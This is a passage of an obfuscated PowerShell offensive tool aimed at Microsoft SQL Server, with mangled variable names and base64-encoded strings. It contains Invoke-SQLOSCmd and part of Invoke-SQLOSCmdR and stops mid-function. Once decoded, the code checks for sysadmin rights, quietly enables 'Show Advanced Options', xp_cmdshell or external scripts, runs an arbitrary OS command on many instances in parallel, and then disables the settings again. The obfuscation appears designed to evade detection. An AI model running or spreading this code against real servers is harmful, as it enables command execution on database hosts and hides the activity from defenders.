                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, ${__/=\____/\__/==\})
                ${__/\/=\/=\/\/\_/\} = $Command.ExecuteReader()
                ${/=\_____/\/\/=\__}.Load(${__/\/=\/=\/\/\_/\})
                ${__/=\____/\__/==\}.Close()
                ${__/=\____/\__/==\}.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    ${/=\_______/===\__} = $_.Exception.Message
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${/=\_____/\/\/=\__}
    }
}

Function  Invoke-SQLOSCmd
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )
    Begin
    {
        ${_____/===\_/=====} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZABSAGUAcwB1AGwAdABzAA=='))))
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                ${__/=\____/\__/==\}.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
                ${_/\_/\/=\/\/=\/\_} = 0
                ${/=\____/\/==\/=\/} = 0
                ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALgA=')))
                    ${/==\_/=\/\/\_/\/=} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAHgAcABfAGMAbQBkAHMAaABlAGwAbAAnAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    ${_/\/===\/\/\/==\/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAG4AbwB0ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAAVABoAGkAcwAgAGMAbwBtAG0AYQBuAGQAIAByAGUAcQB1AGkAcgBlAHMAIABzAHkAcwBhAGQAbQBpAG4AIABwAHIAaQB2AGkAbABlAGcAZQBzAC4A')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))))
                    return
                }
                if (${_/\/===\/\/\/==\/} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAZQBuAGEAYgBsAGUAZAAuAA==')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABkAGkAcwBhAGIAbABlAGQALgA=')))
                    ${_/\_/\/=\/\/=\/\_} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${__/\____/\/\_/\/\} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${__/\____/\/\_/\/\} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A')))
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABmAGEAaQBsAGUAZAAuACAAQQBiAG8AcgB0AGkAbgBnAC4A')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A'))))
                        return
                    }
                }
                if (${/==\_/=\/\/\_/\/=} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAeABwAF8AYwBtAGQAcwBoAGUAbABsACAAaQBzACAAYQBsAHIAZQBhAGQAeQAgAGUAbgBhAGIAbABlAGQALgA=')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAeABwAF8AYwBtAGQAcwBoAGUAbABsACAAaQBzACAAZABpAHMAYQBiAGwAZQBkAC4A')))
                    ${/=\____/\/==\/=\/} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAHgAcABfAGMAbQBkAHMAaABlAGwAbAAnACwAMQA7AFIARQBDAE8ATgBGAEkARwBVAFIARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${___/=\_/\/\__/=\/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAB4AHAAXwBjAG0AZABzAGgAZQBsAGwA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${___/=\_/\/\__/=\/} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAHgAcABfAGMAbQBkAHMAaABlAGwAbAAuAA==')))
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAeABwAF8AYwBtAGQAcwBoAGUAbABsACAAZgBhAGkAbABlAGQALgAgAEEAYgBvAHIAdABpAG4AZwAuAA==')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAHgAcABfAGMAbQBkAHMAaABlAGwAbAAuAA=='))))
                        return
                    }
                }
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgB1AG4AbgBpAG4AZwAgAGMAbwBtAG0AYQBuAGQAOgAgACQAQwBvAG0AbQBhAG4AZAA=')))
                $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAG0AYQBzAHQAZQByAC4ALgB4AHAAXwBjAG0AZABzAGgAZQBsAGwAIAAnACQAQwBvAG0AbQBhAG4AZAAnAA==')))
                ${____/=\_/\___/=\/} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property output -ExpandProperty output
                if($RawResults)
                {
                    ${____/=\_/\___/=\/} | Select output -ExpandProperty output
                }
                else
                {
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ComputerName, $Instance, [string]${____/=\_/\___/=\/})
                }
                if(${/=\____/\/==\/=\/} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIAB4AHAAXwBjAG0AZABzAGgAZQBsAGwA')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAHgAcABfAGMAbQBkAHMAaABlAGwAbAAnACwAMAA7AFIARQBDAE8ATgBGAEkARwBVAFIARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                if(${_/\_/\/=\/\/=\/\_} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIABTAGgAbwB3ACAAQQBkAHYAYQBuAGMAZQBkACAATwBwAHQAaQBvAG4AcwA=')))
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                ${__/=\____/\__/==\}.Close()
                ${__/=\____/\__/==\}.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    ${/=\_______/===\__} = $_.Exception.Message
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${/=\_____/\/\/=\__}
    }
}
Function  Invoke-SQLOSCmdR
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command = "whoami",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )
    Begin
    {
        ${_____/===\_/=====} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZABSAGUAcwB1AGwAdABzAA=='))))
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            if($DAC)
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }
            try
            {
                ${__/=\____/\__/==\}.Open()
                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
                ${_/\_/\/=\/\/=\/\_} = 0
                ${_/===\_/===\/=\/=} = 0
                ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALgA=')))
                    ${_____/\_/\__/==\_} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    ${_/\/===\/\/\/==\/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABhAHIAZQAgAG4AbwB0ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAAVABoAGkAcwAgAGMAbwBtAG0AYQBuAGQAIAByAGUAcQB1AGkAcgBlAHMAIABzAHkAcwBhAGQAbQBpAG4AIABwAHIAaQB2AGkAbABlAGcAZQBzAC4A')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))))
                    return
                }
                if (${_/\/===\/\/\/==\/} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAZQBuAGEAYgBsAGUAZAAuAA==')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABkAGkAcwBhAGIAbABlAGQALgA=')))
                    ${_/\_/\/=\/\/=\/\_} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${__/\____/\/\_/\/\} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${__/\____/\/\_/\/\} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A')))
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABmAGEAaQBsAGUAZAAuACAAQQBiAG8AcgB0AGkAbgBnAC4A')))
                        $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABlAG4AYQBiAGwAZQAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A'))))
                        return
                    }
                }
                if (${_____/\_/\__/==\_} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AHQAZQByAG4AYQBsACAAcwBjAHIAaQBwAHQAcwAgAGEAcgBlACAAYQBsAHIAZQBhAGQAeQAgAGUAbgBhAGIAbABlAGQALgA=')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQB4AHQAZQByAG4AYQBsACAAcwBjAHIAaQBwAHQAcwAgAGUAbgBhAGIAbABlAGQAIABhAHIAZQAgAGQAaQBzAGEAYgBsAGUAZAAuAA==')))
                    ${_/===\_/===\/=\/=} = 1
                    Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFACAAVwBJAFQASAAgAE8AVgBFAFIAUgBJAEQARQA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                    ${/=\_______/\_/\_/} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAiAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMAIABlAG4AYQBiAGwAZQBkACIA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                    if (${/=\_______/\_/\_/} -eq 1)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAGUAeAB0AGUAcgBuAGEAbAAgAHMAYwByAGkAcAB0AHMALgA=')))
                    }
                    else
                    {
